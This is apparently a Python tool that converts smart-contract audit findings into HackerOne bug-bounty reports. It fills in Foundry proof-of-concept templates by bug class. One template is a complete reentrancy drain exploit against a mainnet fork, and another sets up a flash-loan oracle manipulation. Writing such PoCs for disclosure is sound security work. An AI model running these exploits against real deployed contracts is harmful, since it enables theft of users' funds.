"""
HackerOne-Format Report Generator with Foundry PoC templates.
Produces reports compatible with HackerOne's submission format
and generates Foundry test templates based on bug class.
"""
import re
import time
from typing import Dict, List, Optional, Tuple

from cvss_scorer import score_report, cvss_explanation

# Foundry PoC templates by bug class (adapted from web3-poc-foundry SKILL.md)
_FOUNDRY_POC_TEMPLATES = {
    "reentrancy": """// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "forge-std/console.sol";

interface IVulnerable {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

contract ReentrancyExploit {
    IVulnerable target;
    uint256 attackAmount = 1 ether;

    constructor(address _target) {
        target = IVulnerable(_target);
    }

    function attack() external payable {
        target.deposit{value: attackAmount}();
        target.withdraw(attackAmount);
    }

    receive() external payable {
        if (address(target).balance >= attackAmount) {
            target.withdraw(attackAmount);
        }
    }
}

contract ExploitPoC is Test {
    address constant TARGET = {target_addr};
    uint256 constant ATTACK_AMOUNT = 1 ether;

    function setUp() public {
        vm.createSelectFork(vm.envString("MAINNET_RPC_URL"), {fork_block});
        vm.label(TARGET, "VulnerableContract");
    }

    function testExploit() public {
        ReentrancyExploit exploit = new ReentrancyExploit(TARGET);
        vm.deal(address(exploit), ATTACK_AMOUNT);

        uint256 before = address(TARGET).balance;
        console.log("Protocol balance before:", before);

        exploit.attack();

        uint256 balanceAfter = address(TARGET).balance;
        console.log("Protocol balance after:", balanceAfter);
        console.log("Drained:", before - balanceAfter);

        assertEq(balanceAfter, 0, "Drain failed");
    }
}""",

    "oracle_manipulation": """// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "forge-std/console.sol";

interface IBalancerVault {
    function flashLoan(address recipient, address[] calldata tokens, uint256[] calldata amounts, bytes calldata userData) external;
}

contract ExploitPoC is Test {
    address constant BALANCER_VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant TARGET = {target_addr};

    function setUp() public {
        vm.createSelectFork(vm.envString("MAINNET_RPC_URL"), {fork_block});
    }

    function testExploit() public {
        address[] memory tokens = new address[](1);
        tokens[0] = WETH;
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 1000 ether;

        IBalancerVault(BALANCER_VAULT).flashLoan(address(this), tokens, amounts, "");
    }

    function receiveFlashLoan(
        address[] memory, uint256[] memory amounts,
        uint256[] memory, bytes memory
    ) external {
        // Step 1: Manipulate price (swap on AMM)
        // Step 2: Call vulnerable function with inflated/deflated price
        // Step 3: Repay flash loan
        IERC20(WETH).transfer(BALANCER_VAULT, amounts[0]);
    }
}""",

    "access_control": """// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "forge-std/console.sol";

contract ExploitPoC is Test {
    address constant TARGET = {target_addr};
    address attacker = makeAddr("attacker");

    function setUp() public {
        vm.createSelectFork(vm.envString("MAINNET_RPC_URL"), {fork_block});
        vm.label(TARGET, "VulnerableContract");
    }

    function testExploit() public {
        vm.startPrank(attacker);
        // Try calling initialize/privileged function without authorization
        (bool ok,) = TARGET.call(
            abi.encodeWithSignature("initialize(address)", attacker)
        );
        if (ok) {
            console.log("SUCCESS: Unauthorized access granted to attacker");
        } else {
            console.log("PROTECTED: reverted as expected");
        }
        vm.stopPrank();
    }
}""",

    "signature_replay": """// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "forge-std/console.sol";

contract ExploitPoC is Test {
    address constant TARGET = {target_addr};

    function setUp() public {
        vm.createSelectFork(vm.envString("MAINNET_RPC_URL"), {fork_block});
    }

    function testExploit() public {
        // Capture a valid signature
        // Replay it on a different chain or the same chain
        // Assert double-claim succeeds (should revert)
        console.log("Signature replay test - verify double-claim reverts");
    }
}""",

    "erc4626_vault": """// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "forge-std/console.sol";

contract ExploitPoC is Test {
    address constant TARGET = {target_addr};
    address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address victim = makeAddr("victim");

    function setUp() public {
        vm.createSelectFork(vm.envString("MAINNET_RPC_URL"), {fork_block});
    }

    function testExploit() public {
        // Step 1: Attacker deposits 1 wei -> 1 share
        // Step 2: Donate tokens directly to inflate price
        // Step 3: Victim deposits -> 0 shares
        // Step 4: Attacker redeems -> steals victim's deposit
        console.log("First depositor inflation test");
    }
}""",

    "accounting_desync": """// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "forge-std/console.sol";

contract ExploitPoC is Test {
    address constant TARGET = {target_addr};

    function setUp() public {
        vm.createSelectFork(vm.envString("MAINNET_RPC_URL"), {fork_block});
    }

    function testExploit() public {
        // Trace: call startUnstake/harvest sequence
        // Verify: balanceOf(this) - totalSupply drifts over multiple calls
        // Phantom yield accumulates
        console.log("Accounting desync test");
    }
}""",
}

_DEFAULT_POC_TEMPLATE = """// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "forge-std/console.sol";

contract ExploitPoC is Test {
    address constant TARGET = {target_addr};

    function setUp() public {
        vm.createSelectFork(vm.envString("MAINNET_RPC_URL"), {fork_block});
        vm.label(TARGET, "VulnerableContract");
    }

    function testExploit() public {
        uint256 before = TARGET.balance;
        console.log("Before:", before);
        // Exploit logic here
        uint256 after = TARGET.balance;
        console.log("After:", after);
        console.log("Profit:", before - after);
    }
}"""


def _get_poc_template(bug_class: str, target_addr: str = "0x...", fork_block: int = 18000000) -> str:
    """Get a Foundry PoC template for a bug class."""
    template = _FOUNDRY_POC_TEMPLATES.get(bug_class.lower().replace(" ", "_"), _DEFAULT_POC_TEMPLATE)
    return template.replace("{target_addr}", target_addr).replace("{fork_block}", str(fork_block))


_FINDING_HEADING_RE = re.compile(
    r"^#{1,6}\s*(?P<severity>Critical|High|Medium|Low|Info(?:rmational)?)\s*:\s*(?P<name>.+?)\s*$",
    re.IGNORECASE,
)
_SEVERITY_LABEL_RE = re.compile(
    r"\b(Critical|High|Medium|Low|Info(?:rmational)?)\b", re.IGNORECASE
)
_FINDING_FIELD_RE = re.compile(
    r"^\*\*(?P<field>Name|Severity|Category|Description|Exploit Path|Exploit|Fix|PoC|Line):?\*\*\s*:?\s*(?P<value>.*)$",
    re.IGNORECASE,
)


def _normalize_severity_label(value: str) -> str:
    match = _SEVERITY_LABEL_RE.search(value or "")
    if not match:
        return (value or "").strip()
    label = match.group(1).lower()
    return "Info" if label in {"info", "informational"} else label.title()


def _extract_findings(report: str) -> List[Dict]:
    findings = []
    lines = report.split("\n")
    current = {}
    for line in lines:
        heading = _FINDING_HEADING_RE.match(line.strip())
        if heading:
            if current and current.get("name"):
                findings.append(current)
            current = {
                "name": heading.group("name").strip(),
                "severity": _normalize_severity_label(heading.group("severity")),
            }
            continue
        s = re.sub(r"^(?:[-+•]|\*(?!\*)|\d+[.)])\s*", "", line.strip())
        field_match = _FINDING_FIELD_RE.match(s)
        if not field_match:
            continue
        field = field_match.group("field").lower()
        value = field_match.group("value").strip()
        if field == "name":
            if current and current.get("name"):
                findings.append(current)
            current = {"name": value}
        elif current:
            if field == "severity":
                current["severity"] = _normalize_severity_label(value)
            elif field == "category":
                current["category"] = value
            elif field == "description":
                current["description"] = value
            elif field in {"exploit", "exploit path"}:
                current["exploit"] = value
            elif field == "fix":
                current["fix"] = value
            elif field == "poc":
                current["poc"] = value
            elif field == "line":
                current["line"] = value
    if current and current.get("name"):
        findings.append(current)
    return findings


_SCORING_FIELD_NAMES = r"(?:Name|Severity|Description|CVSS Attributes|CVSS Vector|Vector)"
_SCORING_FIELD_MARKER_RE = re.compile(
    rf"^(?P<indent>\s*)(?:[-*+•]|\d+[.)])\s*"
    rf"(?=\*\*{_SCORING_FIELD_NAMES}\*\*\s*:)",
    re.IGNORECASE,
)
_SCORING_FIELD_LINE_RE = re.compile(
    rf"^\*\*{_SCORING_FIELD_NAMES}\*\*\s*:", re.IGNORECASE
)


def _normalize_finding_markers_for_scoring(report: str) -> str:
    """Normalize supported list markers only on fields consumed by score_report."""
    normalized = []
    for line in report.splitlines():
        match = _SCORING_FIELD_MARKER_RE.match(line)
        if match:
            line = f"{match.group('indent')}- {line[match.end():]}"
        else:
            unindented = line.lstrip()
            if _SCORING_FIELD_LINE_RE.match(unindented):
                indent = line[:len(line) - len(unindented)]
                line = f"{indent}- {unindented}"
        normalized.append(line)
    return "\n".join(normalized)


def _extract_rating(report: str) -> str:
    m = re.search(r"### Overall Security Rating:\s*(\S+)", report)
    return m.group(1) if m else "N/A"


def _extract_gas(report: str) -> str:
    m = re.search(r"(### Gas Optimizations.*?)(?=###|$)", report, re.DOTALL)
    return m.group(1).strip() if m else ""


def generate_h1_report(report: str, code: str = "", label: str = "Smart Contract") -> str:
    """Convert an audit report to HackerOne-compatible markdown."""
    findings = _extract_findings(report)
    rating = _extract_rating(report)
    gas = _extract_gas(report)
    cvss = score_report(_normalize_finding_markers_for_scoring(report))

    lines = [
        f"# Security Audit Report: {label}",
        "",
        f"**Date**: {time.strftime('%Y-%m-%d %H:%M:%S UTC', time.gmtime())}",
        f"**Overall Security Rating**: {rating}",
        f"**CVSS 4.0 Max Score**: {cvss['overall_score']}/10 ({cvss['overall_severity']})",
        f"**Total Findings**: {cvss['total_findings']}",
        "",
        "---",
        "",
    ]

    for i, finding in enumerate(cvss["findings"], 1):
        orig = next((f for f in findings if f.get("name") == finding["name"]), {})
        cat = orig.get("category", "")
        lines.extend([
            f"## Vulnerability #{i}: {finding['name']}",
            "",
            f"**Severity**: {finding['severity']}",
            f"**CVSS 4.0 Score**: {'Not assessed' if finding['cvss_score'] is None else str(finding['cvss_score']) + '/10 (' + finding['cvss_severity'] + ')'} [{finding.get('method', '')} | {finding.get('provenance', '')}]",
            f"**CVSS Vector**: `{finding['cvss_vector']}`",
            "",
            f"### Description",
            orig.get("description", "No description provided."),
            "",
        ])
        if orig.get("exploit"):
            lines.extend([
                "### Steps to Reproduce",
                orig["exploit"],
                "",
            ])
        if orig.get("poc"):
            lines.extend([
                "### Proof of Concept",
                f"```solidity",
                orig["poc"],
                f"```",
                "",
            ])
        else:
            # Generate Foundry PoC template from bug class
            poc_template = _get_poc_template(cat or finding.get("severity", "Medium"))
            lines.extend([
                "### Proof of Concept (Template)",
                "```solidity",
                poc_template,
                "```",
                "",
            ])
        if orig.get("fix"):
            lines.extend([
                "### Remediation",
                orig["fix"],
                "",
            ])
        lines.append("---")
        lines.append("")

    if gas:
        lines.extend([
            "## Gas Optimizations",
            "",
            gas,
            "",
        ])

    # CVSS appendix
    lines.extend([
        "## CVSS 4.0 Breakdown",
        "",
        cvss_explanation(cvss["overall_score"], cvss["overall_severity"],
                         f"CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N"),
        "",
        "---",
        "",
        "*Report generated by Smart Contract Auditor*",
    ])

    return "\n".join(lines)


def generate_h1_short(report: str, label: str = "Smart Contract") -> str:
    """Generate a concise HackerOne report, suitable for copy-paste."""
    findings = _extract_findings(report)
    rating = _extract_rating(report)
    cvss = score_report(_normalize_finding_markers_for_scoring(report))

    lines = [
        f"## Summary",
        f"- **Asset**: {label}",
        f"- **Severity**: {cvss['overall_severity']} (CVSS 4.0: {cvss['overall_score']}/10)",
        f"- **Rating**: {rating}",
        "",
        f"## Vulnerability Details",
        "",
    ]

    for i, finding in enumerate(cvss["findings"], 1):
        lines.append(f"### {i}. {finding['name']}")
        score_txt = 'Not assessed' if finding['cvss_score'] is None else f"{finding['cvss_score']}/10"
        lines.append(f"**CVSS**: {score_txt} [{finding.get('method', '')} | {finding.get('provenance', '')}] | **Severity**: {finding['severity']}")
        lines.append("")

    lines.append("")
    lines.append("## Impact")
    lines.append("As described in each finding above.")
    lines.append("")
    lines.append("## Recommendation")
    lines.append("Apply the fixes described in the full report.")
    lines.append("")

    return "\n".join(lines)
